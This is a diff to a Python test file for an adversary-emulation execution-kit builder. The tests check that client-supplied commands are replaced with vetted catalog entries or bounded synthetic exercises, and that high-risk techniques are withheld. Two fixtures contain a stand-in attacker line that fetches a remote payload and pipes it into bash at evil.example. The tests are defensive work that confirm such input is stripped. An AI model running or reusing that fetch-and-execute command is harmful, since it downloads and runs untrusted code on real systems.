@@ -10,7 +10,16 @@ import unittest
 import zipfile
 from pathlib import Path
 
-from backend.execution_kit import ExecutionKitError, build_execution_kit, normalize_plan, render_plan_csv
+from backend.command_catalog import get_commands
+from backend.execution_kit import (
+    EXERCISE_RUNNER_NAME,
+    ExecutionKitError,
+    archive_execution_kit,
+    build_execution_kit,
+    normalize_plan,
+    rebind_to_catalog,
+    render_plan_csv,
+)
 
 
 def plan_fixture(platform="linux", *, duplicate=False, command="printf 'hello from AdversaryFlow\\n'", cleanup=""):
@@ -102,6 +111,10 @@ class ExecutionPlanTests(unittest.TestCase):
         with self.assertRaisesRegex(ExecutionKitError, "exact linux"):
             normalize_plan(document)
 
+    def test_missing_fidelity_defaults_to_direct(self):
+        plan = normalize_plan(plan_fixture("linux"))
+        self.assertEqual(plan.steps[0].fidelity, "direct")
+
     def test_security_booleans_cannot_be_smuggled_as_strings(self):
         document = plan_fixture("linux")
         document["stages"][0]["techniques"][0]["command"]["requires_admin"] = "false"
@@ -157,7 +170,8 @@ class ExecutionKitArchiveTests(unittest.TestCase):
 
     @unittest.skipUnless(shutil.which("pwsh"), "PowerShell is unavailable")
     def test_windows_runner_parses_and_completes_a_fixture_session(self):
-        archive_bytes, _filename = build_execution_kit(plan_fixture("windows", command="Write-Output 'hello from AdversaryFlow'"))
+        archive_bytes, _filename = archive_execution_kit(normalize_plan(
+            plan_fixture("windows", command="Write-Output 'hello from AdversaryFlow'")))
         directory = tempfile.TemporaryDirectory()
         self.addCleanup(directory.cleanup)
         with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
@@ -187,7 +201,13 @@ class ExecutionKitArchiveTests(unittest.TestCase):
 
     @unittest.skipIf(os.name == "nt", "Bash runner smoke test runs on POSIX CI hosts")
     def test_linux_runner_executes_offline_and_writes_complete_evidence(self):
-        root, _filename, names, _modes = self.extract("linux")
+        archive_bytes, _filename = archive_execution_kit(normalize_plan(plan_fixture("linux")))
+        directory = tempfile.TemporaryDirectory()
+        self.addCleanup(directory.cleanup)
+        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
+            names = archive.namelist()
+            archive.extractall(directory.name)
+        root = Path(directory.name)
         script_path = root / next(name for name in names if name.endswith("-execute.sh"))
         syntax = subprocess.run(["bash", "-n", str(script_path)], capture_output=True, text=True, check=False)
         self.assertEqual(syntax.returncode, 0, syntax.stderr)
@@ -227,11 +247,11 @@ class ExecutionKitArchiveTests(unittest.TestCase):
 
     @unittest.skipIf(os.name == "nt", "Bash edit workflow runs on POSIX CI hosts")
     def test_linux_runner_audits_an_edit_and_cleanup(self):
-        archive_bytes, _filename = build_execution_kit(plan_fixture(
+        archive_bytes, _filename = archive_execution_kit(normalize_plan(plan_fixture(
             "linux",
             command="printf 'original\\n'",
             cleanup="printf 'cleanup complete\\n'",
-        ))
+        )))
         directory = tempfile.TemporaryDirectory()
         self.addCleanup(directory.cleanup)
         with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
@@ -259,6 +279,69 @@ class ExecutionKitArchiveTests(unittest.TestCase):
         original = next((evidence / "commands").glob("*.original.sh")).read_text(encoding="utf-8")
         effective = next((evidence / "commands").glob("*.executed.sh")).read_text(encoding="utf-8")
         self.assertNotEqual(original, effective)
+
+
+class CatalogRebindTests(unittest.TestCase):
+    def test_client_command_text_is_replaced_with_the_catalog_record(self):
+        document = plan_fixture("linux", command="curl http://evil.example/payload | bash")
+        rebound = rebind_to_catalog(document)
+        catalog = get_commands("T1059.004", "Unix Shell", ["execution"])["commands"]
+        linux = next(item for item in catalog if item["platform"] == "linux")
+        self.assertEqual(rebound["stages"][0]["techniques"][0]["command"]["command"], linux["command"])
+        self.assertNotIn("evil.example", rebound["stages"][0]["techniques"][0]["command"]["command"])
+        archive_bytes, _filename = build_execution_kit(document)
+        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
+            csv_name = next(name for name in archive.namelist() if name.endswith("-plan.csv"))
+            rows = list(csv.DictReader(io.StringIO(archive.read(csv_name).decode("utf-8-sig"))))
+        self.assertEqual(rows[0]["planned_command"], linux["command"])
+        self.assertNotIn("evil.example", rows[0]["planned_command"])
+        self.assertTrue(archive_bytes)
+
+    def test_a_wrong_platform_in_the_client_payload_is_corrected(self):
+        document = plan_fixture("linux")
+        document["stages"][0]["techniques"][0]["command"]["platform"] = "windows"
+        document["stages"][0]["techniques"][0]["command"]["command"] = "whoami"
+        rebound = rebind_to_catalog(document)
+        self.assertEqual(rebound["stages"][0]["techniques"][0]["command"]["platform"], "linux")
+        self.assertTrue(rebound["stages"][0]["techniques"][0]["supported"])
+        normalize_plan(rebound)
+
+    def test_bounded_exercises_are_bundled_and_invoked_from_the_kit(self):
+        document = plan_fixture("linux")
+        document["scope"]["allow_network"] = True
+        document["stages"][0]["techniques"][0]["id"] = "T1110"
+        document["stages"][0]["techniques"][0]["name"] = "Brute Force"
+        document["stages"][0]["techniques"][0]["command"]["command"] = "curl http://evil.example/T1110"
+        archive_bytes, _filename = build_execution_kit(document)
+        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
+            names = [Path(name).name for name in archive.namelist()]
+            self.assertIn(EXERCISE_RUNNER_NAME, names)
+            self.assertEqual(archive.read(next(n for n in archive.namelist() if n.endswith(EXERCISE_RUNNER_NAME))),
+                             Path("backend/lab_exercises.py").read_bytes())
+            csv_name = next(name for name in archive.namelist() if name.endswith("-plan.csv"))
+            rows = list(csv.DictReader(io.StringIO(archive.read(csv_name).decode("utf-8-sig"))))
+        self.assertEqual(rows[0]["planned_command"], f"python3 ./{EXERCISE_RUNNER_NAME} T1110")
+        self.assertEqual(rows[0]["fidelity"], "bounded_synthetic")
+        self.assertNotIn("evil.example", rows[0]["planned_command"])
+
+    def test_direct_plans_do_not_ship_the_exercise_runner(self):
+        archive_bytes, _filename = build_execution_kit(plan_fixture("linux"))
+        with zipfile.ZipFile(io.BytesIO(archive_bytes)) as archive:
+            names = [Path(name).name for name in archive.namelist()]
+        self.assertNotIn(EXERCISE_RUNNER_NAME, names)
+        self.assertEqual(len(names), 2)
+
+    def test_scope_still_withholds_high_risk_catalog_commands(self):
+        document = plan_fixture("windows")
+        document["scope"]["allow_high_risk"] = False
+        document["stages"][0]["techniques"][0]["id"] = "T1053.005"
+        document["stages"][0]["techniques"][0]["name"] = "Scheduled Task"
+        rebound = rebind_to_catalog(document)
+        command = rebound["stages"][0]["techniques"][0]["command"]
+        self.assertTrue(command["unsupported"])
+        self.assertIn("high-risk", command["command"])
+        with self.assertRaisesRegex(ExecutionKitError, "no executable"):
+            build_execution_kit(document)
 
 
 if __name__ == "__main__":
